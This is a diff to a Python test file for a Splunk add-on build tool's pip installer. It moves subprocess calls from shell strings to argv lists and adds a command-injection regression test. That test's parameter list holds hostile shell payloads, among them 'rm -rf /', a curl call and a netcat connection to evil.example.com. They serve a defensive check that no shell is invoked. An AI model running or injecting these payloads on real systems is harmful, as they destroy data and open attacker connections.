@@ -22,6 +22,7 @@ from splunk_add_on_ucc_framework.install_python_libraries import (
     CouldNotInstallRequirements,
     SplunktaucclibNotFound,
     install_libraries,
+    install_os_dependent_libraries,
     install_python_libraries,
     remove_execute_bit,
     remove_packages,
@@ -116,20 +117,31 @@ def test_install_libraries(mock_subprocess_run):
         "python3",
     )
 
-    expected_install_command = (
-        'python3 -m pip install -r "package/lib/requirements.txt"'
-        ' --target "/path/to/output/addon_name/lib" '
-        "--no-compile --prefer-binary --ignore-installed "
-    )
-    expected_pip_update_command = "python3 -m pip install --upgrade pip"
+    expected_install_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "-r",
+        "package/lib/requirements.txt",
+        "--target",
+        "/path/to/output/addon_name/lib",
+        "--no-compile",
+        "--prefer-binary",
+        "--ignore-installed",
+    ]
+    expected_pip_update_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "--upgrade",
+        "pip",
+    ]
     mock_subprocess_run.assert_has_calls(
         [
-            mock.call(
-                expected_pip_update_command, shell=True, env=None, capture_output=True
-            ),
-            mock.call(
-                expected_install_command, shell=True, env=None, capture_output=True
-            ),
+            mock.call(expected_pip_update_command, env=None, capture_output=True),
+            mock.call(expected_install_command, env=None, capture_output=True),
         ]
     )
 
@@ -497,17 +509,17 @@ def test_install_libraries_valid_os_libraries(
         "--platform win_amd64 "
         "--python-version 37 "
         f"--target {tmp_ucc_lib_target}/3rdparty/windows "
-        "--only-binary=:all: cryptography==41.0.5  \nINFO"
+        "--only-binary=:all: cryptography==41.0.5"
     )
 
     log_message_expected_2 = (
-        "python3 -m pip install  "
+        "python3 -m pip install "
         "--no-compile "
         "--platform manylinux2014_x86_64 "
         "--python-version 37 "
         f"--target {tmp_ucc_lib_target}/3rdparty/linux "
         "--only-binary=:all: cryptography==41.0.5 "
-        "--ignore-requires-python "
+        "--ignore-requires-python"
     )
 
     log_message_expected_3 = (
@@ -517,7 +529,7 @@ def test_install_libraries_valid_os_libraries(
         "--platform macosx_10_12_universal2 "
         "--python-version 37 "
         f"--target {tmp_ucc_lib_target}/3rdparty/darwin "
-        "--only-binary=:all: cryptography==41.0.5  \nINFO"
+        "--only-binary=:all: cryptography==41.0.5"
     )
 
     assert log_message_expected_1 in caplog.text
@@ -564,14 +576,18 @@ def test_install_libraries_version_mismatch(
     tmp_lib_reqs_file = tmp_lib_path / "requirements.txt"
     tmp_lib_reqs_file.write_text("splunktaucclib\n")
 
-    version_mismatch_shell_cmd = "python3 -m pip show --version cryptography"
-    mock_subprocess_run.side_effect = (
-        lambda command, shell=True, env=None, capture_output=True: (
-            MockSubprocessResult(1)
-            if command == version_mismatch_shell_cmd
-            and ucc_lib_target == env["PYTHONPATH"]
-            else MockSubprocessResult(0, b"Version: 40.0.0")
-        )
+    version_mismatch_cmd = [
+        "python3",
+        "-m",
+        "pip",
+        "show",
+        "--version",
+        "cryptography",
+    ]
+    mock_subprocess_run.side_effect = lambda command, env=None, capture_output=True: (
+        MockSubprocessResult(1)
+        if command == version_mismatch_cmd and ucc_lib_target == env["PYTHONPATH"]
+        else MockSubprocessResult(0, b"Version: 40.0.0")
     )
 
     with pytest.raises(CouldNotInstallRequirements):
@@ -583,7 +599,7 @@ def test_install_libraries_version_mismatch(
         )
 
     version_mismatch_log = (
-        f"Command ({version_mismatch_shell_cmd}) returned 1 status code"
+        f"Command ({' '.join(version_mismatch_cmd)}) returned 1 status code"
     )
     error_description = """
 OS dependent library cryptography = 41.0.5 SHOULD be defined in requirements.txt.
@@ -609,20 +625,31 @@ def test_install_libraries_custom_pip(mock_subprocess_run):
         pip_version="21.666.666",
     )
 
-    expected_install_command = (
-        'python3 -m pip install -r "package/lib/requirements.txt"'
-        ' --target "/path/to/output/addon_name/lib" '
-        "--no-compile --prefer-binary --ignore-installed "
-    )
-    expected_pip_update_command = "python3 -m pip install --upgrade pip==21.666.666"
+    expected_install_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "-r",
+        "package/lib/requirements.txt",
+        "--target",
+        "/path/to/output/addon_name/lib",
+        "--no-compile",
+        "--prefer-binary",
+        "--ignore-installed",
+    ]
+    expected_pip_update_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "--upgrade",
+        "pip==21.666.666",
+    ]
     mock_subprocess_run.assert_has_calls(
         [
-            mock.call(
-                expected_pip_update_command, shell=True, env=None, capture_output=True
-            ),
-            mock.call(
-                expected_install_command, shell=True, env=None, capture_output=True
-            ),
+            mock.call(expected_pip_update_command, env=None, capture_output=True),
+            mock.call(expected_install_command, env=None, capture_output=True),
         ]
     )
 
@@ -638,20 +665,32 @@ def test_install_libraries_legacy_resolver(mock_subprocess_run):
         pip_legacy_resolver=True,
     )
 
-    expected_install_command = (
-        'python3 -m pip install -r "package/lib/requirements.txt"'
-        ' --use-deprecated=legacy-resolver --target "/path/to/output/addon_name/lib" '
-        "--no-compile --prefer-binary --ignore-installed "
-    )
-    expected_pip_update_command = "python3 -m pip install --upgrade pip"
+    expected_install_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "-r",
+        "package/lib/requirements.txt",
+        "--use-deprecated=legacy-resolver",
+        "--target",
+        "/path/to/output/addon_name/lib",
+        "--no-compile",
+        "--prefer-binary",
+        "--ignore-installed",
+    ]
+    expected_pip_update_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "--upgrade",
+        "pip",
+    ]
     mock_subprocess_run.assert_has_calls(
         [
-            mock.call(
-                expected_pip_update_command, shell=True, env=None, capture_output=True
-            ),
-            mock.call(
-                expected_install_command, shell=True, env=None, capture_output=True
-            ),
+            mock.call(expected_pip_update_command, env=None, capture_output=True),
+            mock.call(expected_install_command, env=None, capture_output=True),
         ]
     )
 
@@ -711,7 +750,7 @@ def test_is_pip_lib_installed_do_not_write_bytecode(monkeypatch):
     Result = namedtuple("Result", ["returncode", "stdout", "stderr"])
 
     def run(command, env):
-        assert command == "python3 -m pip show --version libname"
+        assert command == ["python3", "-m", "pip", "show", "--version", "libname"]
         assert env["PYTHONPATH"] == "target"
         assert env["PYTHONDONTWRITEBYTECODE"] == "1"
         return Result(0, b"Version: 1.0.0", b"")
@@ -731,19 +770,30 @@ def test_install_libraries_pip_custom_flag(mock_subprocess_run):
         pip_custom_flag="--report path/to/json.json",
     )
 
-    expected_install_command = (
-        'python3 -m pip install -r "package/lib/requirements.txt"'
-        ' --target "/path/to/output/addon_name/lib" --report path/to/json.json'
-    )
-    expected_pip_update_command = "python3 -m pip install --upgrade pip"
+    expected_install_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "-r",
+        "package/lib/requirements.txt",
+        "--target",
+        "/path/to/output/addon_name/lib",
+        "--report",
+        "path/to/json.json",
+    ]
+    expected_pip_update_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "--upgrade",
+        "pip",
+    ]
     mock_subprocess_run.assert_has_calls(
         [
-            mock.call(
-                expected_pip_update_command, shell=True, env=None, capture_output=True
-            ),
-            mock.call(
-                expected_install_command, shell=True, env=None, capture_output=True
-            ),
+            mock.call(expected_pip_update_command, env=None, capture_output=True),
+            mock.call(expected_install_command, env=None, capture_output=True),
         ]
     )
 
@@ -760,20 +810,36 @@ def test_install_libraries_multiple_pip_custom_flags(mock_subprocess_run):
         "--report path/to/json.json --progress-bar on --require-hashes",
     )
 
-    expected_install_command = (
-        'python3 -m pip install -r "package/lib/requirements.txt"'
-        ' --target "/path/to/output/addon_name/lib" --no-compile --prefer-binary --ignore-installed '
-        "--report path/to/json.json --progress-bar on --require-hashes"
-    )
-    expected_pip_update_command = "python3 -m pip install --upgrade pip"
+    expected_install_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "-r",
+        "package/lib/requirements.txt",
+        "--target",
+        "/path/to/output/addon_name/lib",
+        "--no-compile",
+        "--prefer-binary",
+        "--ignore-installed",
+        "--report",
+        "path/to/json.json",
+        "--progress-bar",
+        "on",
+        "--require-hashes",
+    ]
+    expected_pip_update_command = [
+        "python3",
+        "-m",
+        "pip",
+        "install",
+        "--upgrade",
+        "pip",
+    ]
     mock_subprocess_run.assert_has_calls(
         [
-            mock.call(
-                expected_pip_update_command, shell=True, env=None, capture_output=True
-            ),
-            mock.call(
-                expected_install_command, shell=True, env=None, capture_output=True
-            ),
+            mock.call(expected_pip_update_command, env=None, capture_output=True),
+            mock.call(expected_install_command, env=None, capture_output=True),
         ]
     )
 
@@ -911,3 +977,96 @@ def test_install_python_libraries_no_mocks_with_excludes(tmp_path, packages):
 
     assert glob.glob(f"{target}/pkg_1_plus_2/test_pkg_1")
     assert not glob.glob(f"{target}/pkg_1_plus_2/test_pkg_2")
+
+
+# VULN-87310 regression: any of the `os-dependentLibraries[]` fields can carry
+# arbitrary characters, and the install pipeline must never execute them through
+# a shell. We assert: (1) subprocess.run is called with an argv list and without
+# `shell=True`, (2) injected shell metacharacters survive as literal argv tokens.
+@pytest.mark.parametrize(
+    "injection",
+    [
+        "$(id > /tmp/UCC_PWNED)",
+        "`id > /tmp/UCC_PWNED`",
+        "; rm -rf /",
+        "&& curl evil.example.com",
+        "| nc evil.example.com 4444",
+        "> /tmp/owned",
+        "$IFS$9id",
+        "'; touch /tmp/x; '",
+    ],
+)
+@pytest.mark.parametrize(
+    "injected_field",
+    ["platform", "python_version", "name", "version", "target"],
+)
+@mock.patch("subprocess.run", autospec=True)
+def test_install_os_dependent_libraries_does_not_invoke_shell(
+    mock_subprocess_run,
+    os_dependent_library_config,
+    injected_field,
+    injection,
+    tmp_path,
+):
+    mock_subprocess_run.return_value = MockSubprocessResult(0, b"Version: 1.0.0")
+
+    fields = {
+        "name": "cryptography",
+        "version": "41.0.5",
+        "platform": "manylinux2014_x86_64",
+        "python_version": "37",
+        "target": "3rdparty/linux",
+    }
+    fields[injected_field] = injection
+
+    lib = OSDependentLibraryConfig(
+        name=fields["name"],
+        version=fields["version"],
+        platform=fields["platform"],
+        python_version=fields["python_version"],
+        target=fields["target"],
+        os="linux",
+        deps_flag="",
+        dependencies=True,
+    )
+
+    install_os_dependent_libraries(
+        ucc_lib_target=str(tmp_path),
+        installer="python3",
+        os_libraries=[lib],
+    )
+
+    # 1. No call may pass `shell=True` (the sink that VULN-87310 exploited).
+    for call in mock_subprocess_run.call_args_list:
+        assert (
+            call.kwargs.get("shell", False) is False
+        ), f"subprocess.run called with shell=True for {call}"
+
+    # 2. Every command must be an argv list, and the injected value must appear
+    # as a single literal token rather than being interpreted by a shell.
+    pip_calls = [
+        c
+        for c in mock_subprocess_run.call_args_list
+        if isinstance(c.args[0], list) and "install" in c.args[0]
+    ]
+    assert pip_calls, "expected at least one pip install argv call"
+    download_call = pip_calls[-1]
+    argv = download_call.args[0]
+    assert isinstance(argv, list)
+    if injected_field == "name":
+        assert f"{injection}=={fields['version']}" in argv
+    elif injected_field == "version":
+        assert f"{fields['name']}=={injection}" in argv
+    elif injected_field == "target":
+        # `target_path` is normalized by `os.path.normpath` and joined under
+        # `ucc_lib_target` (which may strip trailing separators), so we check
+        # that some argv token contains a recognizable substring of the
+        # injection — confirming it survived as a single literal token rather
+        # than being split or evaluated by a shell.
+        injection_normalized = os.path.normpath(injection).strip("/").strip(".")
+        marker = injection_normalized or injection.strip()
+        assert any(
+            marker in token for token in argv
+        ), f"injection marker {marker!r} not found in argv {argv!r}"
+    else:
+        assert injection in argv
